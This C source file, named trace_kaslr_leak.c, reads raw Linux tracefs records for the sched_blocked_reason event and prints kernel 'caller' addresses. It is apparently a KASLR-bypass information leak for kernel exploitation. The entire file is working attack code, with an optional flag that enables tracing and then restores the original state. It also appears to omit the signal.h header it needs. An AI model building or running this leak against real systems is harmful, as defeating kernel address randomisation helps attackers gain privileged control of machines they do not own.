/*
 * trace_kaslr_leak.c — bounded offline-compatible reader for
 * sched_blocked_reason trace_pipe_raw.
 *
 * The event format on the target is:
 *   common_type:      payload + 0, size 2 (ID 109)
 *   event pid:        payload + 8, size 4
 *   caller:           payload + 16, size 8
 *   io_wait:          payload + 24, size 1
 *
 * The raw stream may contain a ring-buffer record header before the event
 * payload.  Therefore the reader scans aligned positions for event ID 109
 * instead of assuming a fixed record-header size.
 *
 * Default mode is read-only: it does not write enable/tracing_on and does not
 * change their state.  Pass --enable only when a caller explicitly wants the
 * tool to enable the event; the original values are restored on exit.
 */

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define EVENT_ENABLE "/sys/kernel/tracing/events/sched/sched_blocked_reason/enable"
#define TRACING_ON   "/sys/kernel/tracing/tracing_on"
#define TRACE_TEXT   "/sys/kernel/tracing/trace_pipe"
#define EVENT_ID     109
#define PID_OFF      8
#define CALLER_OFF   16
#define MIN_PAYLOAD  25
#define READ_BUF     65536
#define DEFAULT_TIMEOUT_MS 2000

static volatile sig_atomic_t stop_requested;

static void on_signal(int sig) {
    (void)sig;
    stop_requested = 1;
}

static int read_flag(const char *path, int *value) {
    char buf[8] = {0};
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    *value = (buf[0] == '1') ? 1 : 0;
    return 0;
}

static int write_flag(const char *path, int value) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    char c = value ? '1' : '0';
    ssize_t n = write(fd, &c, 1);
    close(fd);
    return n == 1 ? 0 : -1;
}

static int read_with_timeout(int fd, void *buf, size_t len, int timeout_ms) {
    struct pollfd pfd = {.fd = fd, .events = POLLIN};
    int rc = poll(&pfd, 1, timeout_ms);
    if (rc <= 0) return rc;
    if (!(pfd.revents & (POLLIN | POLLPRI))) return -1;
    return (int)read(fd, buf, len);
}

static int is_canonical_kernel_ptr(uint64_t value) {
    return value != UINT64_MAX && (value >> 48) == 0xffff;
}

static int scan_raw(const unsigned char *buf, int len, int *seq, int limit) {
    int found = 0;
    for (int pos = 0; pos + MIN_PAYLOAD <= len && *seq < limit; pos += 4) {
        uint16_t type = (uint16_t)buf[pos] | ((uint16_t)buf[pos + 1] << 8);
        if (type != EVENT_ID) continue;

        int32_t pid = (int32_t)((uint32_t)buf[pos + PID_OFF] |
                                ((uint32_t)buf[pos + PID_OFF + 1] << 8) |
                                ((uint32_t)buf[pos + PID_OFF + 2] << 16) |
                                ((uint32_t)buf[pos + PID_OFF + 3] << 24));
        uint64_t caller = 0;
        for (int i = 0; i < 8; ++i)
            caller |= (uint64_t)buf[pos + CALLER_OFF + i] << (8 * i);
        if (pid <= 0 || pid >= 1000000 || !is_canonical_kernel_ptr(caller))
            continue;

        printf("[%d] pid=%d caller=0x%016llx\n", *seq, pid,
               (unsigned long long)caller);
        ++(*seq);
        ++found;
    }
    return found;
}

static void usage(const char *prog) {
    fprintf(stderr,
            "Usage: %s [-n COUNT] [-c CPU] [-t TIMEOUT_MS] [--enable]\n"
            "  -n COUNT       maximum records (default 20)\n"
            "  -c CPU         CPU number (default 0)\n"
            "  -t TIMEOUT_MS  read timeout (default %d)\n"
            "  --enable       enable event/tracing_on and restore original state\n",
            prog, DEFAULT_TIMEOUT_MS);
}

int main(int argc, char **argv) {
    int count = 20;
    int cpu_num = 0;
    int timeout_ms = DEFAULT_TIMEOUT_MS;
    int request_enable = 0;
    int old_enable = 0;
    int old_tracing = 0;
    int state_saved = 0;
    int seq = 0;
    int rc = 0;
    int fd = -1;

    for (int i = 1; i < argc; ++i) {
        if (!strcmp(argv[i], "-n") && i + 1 < argc) count = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-c") && i + 1 < argc) cpu_num = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-t") && i + 1 < argc) timeout_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--enable")) request_enable = 1;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        } else {
            usage(argv[0]);
            return 2;
        }
    }
    if (count <= 0 || timeout_ms <= 0) return 2;

    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);

    if (request_enable) {
        if (read_flag(EVENT_ENABLE, &old_enable) < 0 ||
            read_flag(TRACING_ON, &old_tracing) < 0) {
            fprintf(stderr, "[!] Cannot read original tracefs state: %s\n",
                    strerror(errno));
            return 1;
        }
        state_saved = 1;
        if (write_flag(TRACING_ON, 1) < 0 || write_flag(EVENT_ENABLE, 1) < 0) {
            fprintf(stderr, "[!] Cannot enable trace event: %s\n", strerror(errno));
            rc = 1;
            goto cleanup;
        }
    }

    char raw_path[128];
    snprintf(raw_path, sizeof(raw_path),
             "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu_num);
    fd = open(raw_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "[!] Cannot open %s: %s\n", raw_path, strerror(errno));
        rc = 1;
        goto cleanup;
    }
    fprintf(stderr, "[*] reading %s (caller payload offset %d)\n",
            raw_path, CALLER_OFF);

    while (!stop_requested && seq < count) {
        unsigned char buf[READ_BUF];
        int n = read_with_timeout(fd, buf, sizeof(buf), timeout_ms);
        if (n == 0) break;
        if (n < 0) {
            fprintf(stderr, "[!] raw read failed: %s\n", strerror(errno));
            rc = 1;
            break;
        }
        scan_raw(buf, n, &seq, count);
    }
    close(fd);
    fd = -1;
    fprintf(stderr, "[+] captured %d event(s)\n", seq);

cleanup:
    if (fd >= 0) close(fd);
    if (state_saved) {
        if (write_flag(EVENT_ENABLE, old_enable) < 0 ||
            write_flag(TRACING_ON, old_tracing) < 0) {
            fprintf(stderr, "[!] Failed to restore tracefs state\n");
            rc = 1;
        }
    }
    return rc;
}
